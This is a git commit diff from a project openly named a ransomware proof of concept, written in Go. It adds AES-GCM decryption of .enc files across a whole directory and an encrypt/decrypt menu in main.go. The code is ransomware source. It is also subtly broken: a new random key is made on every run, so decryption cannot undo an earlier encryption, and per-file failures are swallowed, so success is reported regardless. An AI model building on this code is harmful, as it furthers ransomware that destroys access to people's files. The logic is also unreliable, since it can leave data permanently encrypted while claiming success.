c2d703848d13417a269a96b55ce28b80e190f81d
Arvind Iyer <rbarvind04@gmail.com>
2024-10-11 14:00:54 -0400

    Added decryption logic

---
+++ decryption/decrypt.go
@@ -0,0 +1,97 @@
+package decryption
+
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	"fmt"
+	"io"
+	"os"
+	"path/filepath"
+	"strings"
+)
+
+// DecryptFile decrypts a single .enc file and restores it to its original form
+func DecryptFile(encFilePath string, key []byte) error {
+	// Open the encrypted file for reading
+	inFile, err := os.Open(encFilePath)
+	if err != nil {
+		return fmt.Errorf("could not open encrypted file %v: %v", encFilePath, err)
+	}
+	defer inFile.Close()
+
+	// Read the nonce (the first part of the file)
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return fmt.Errorf("could not create cipher block: %v", err)
+	}
+
+	aesgcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return fmt.Errorf("could not create GCM: %v", err)
+	}
+
+	nonceSize := aesgcm.NonceSize()
+	nonce := make([]byte, nonceSize)
+
+	_, err = io.ReadFull(inFile, nonce)
+	if err != nil {
+		return fmt.Errorf("could not read nonce from file: %v", err)
+	}
+
+	// Read the rest of the file (the ciphertext and tag)
+	ciphertext, err := io.ReadAll(inFile)
+	if err != nil {
+		return fmt.Errorf("could not read ciphertext from file: %v", err)
+	}
+
+	// Decrypt the file content
+	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		return fmt.Errorf("decryption failed: %v", err)
+	}
+
+	// Create the output file by removing the .enc extension
+	origFilePath := strings.TrimSuffix(encFilePath, ".enc")
+	outFile, err := os.Create(origFilePath)
+	if err != nil {
+		return fmt.Errorf("could not create decrypted file %v: %v", origFilePath, err)
+	}
+	defer outFile.Close()
+
+	// Write the decrypted content to the output file
+	_, err = outFile.Write(plaintext)
+	if err != nil {
+		return fmt.Errorf("could not write to decrypted file %v: %v", origFilePath, err)
+	}
+
+	// Remove the encrypted file after successful decryption
+	err = os.Remove(encFilePath)
+	if err != nil {
+		return fmt.Errorf("could not delete encrypted file %v: %v", encFilePath, err)
+	}
+
+	fmt.Printf("Decrypted %s -> %s\n", encFilePath, origFilePath)
+	return nil
+}
+
+// DecryptFilesInDirectory decrypts all .enc files in a given directory
+func DecryptFilesInDirectory(dirPath string, key []byte) error {
+	// Walk through all files in the directory
+	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+
+		// Only decrypt files with the .enc extension
+		if !info.IsDir() && strings.HasSuffix(info.Name(), ".enc") {
+			// Decrypt the file
+			err := DecryptFile(path, key)
+			if err != nil {
+				fmt.Printf("Failed to decrypt file %s: %v\n", path, err)
+			}
+		}
+		return nil
+	})
+	return err
+}
+
--- main.go
+++ main.go
@@ -2,9 +2,21 @@ package main
 
 import (
 	"fmt"
-	"github.com/arviiyer/ransomware-poc/encryption" // Import your encryption package
+	"github.com/arviiyer/ransomware-poc/encryption"  // Import the encryption package
+	"github.com/arviiyer/ransomware-poc/decryption"  // Import the decryption package
+	"strings"
 )
 
+// Get the user's choice (Encrypt or Decrypt)
+func getUserChoice() string {
+	var choice string
+	fmt.Print("Would you like to encrypt or decrypt? (e/d): ")
+	fmt.Scanln(&choice)
+	choice = strings.TrimSpace(strings.ToLower(choice))
+	return choice
+}
+
+// Get directory path from the user
 func getUserInput() string {
 	var dirPath string
 	fmt.Print("Enter directory path: ")
@@ -14,18 +26,35 @@ func getUserInput() string {
 }
 
 func main() {
+	// Ask the user if they want to encrypt or decrypt
+	choice := getUserChoice()
+
 	// Get the directory from the user
 	dirPath := getUserInput()
 
-	// Generate an AES-256 encryption key
+	// Generate an AES-256 encryption key (or you could provide a way to reuse the same key)
 	key := encryption.GenerateAESKey()
 
-	// Encrypt all files in the directory
-	err := encryption.EncryptFilesInDirectory(dirPath, key)
-	if err != nil {
-		fmt.Println("Error encrypting files in the directory:", err)
-	} else {
-		fmt.Println("All files in the directory were encrypted successfully!")
+	// Perform the requested action (encrypt or decrypt)
+	switch choice {
+	case "e":
+		// Encrypt all files in the directory
+		err := encryption.EncryptFilesInDirectory(dirPath, key)
+		if err != nil {
+			fmt.Println("Error encrypting files in the directory:", err)
+		} else {
+			fmt.Println("All files in the directory were encrypted successfully!")
+		}
+	case "d":
+		// Decrypt all .enc files in the directory
+		err := decryption.DecryptFilesInDirectory(dirPath, key)
+		if err != nil {
+			fmt.Println("Error decrypting files in the directory:", err)
+		} else {
+			fmt.Println("All .enc files in the directory were decrypted successfully!")
+		}
+	default:
+		fmt.Println("Invalid choice. Please enter 'e' for encryption or 'd' for decryption.")
 	}
 }
 
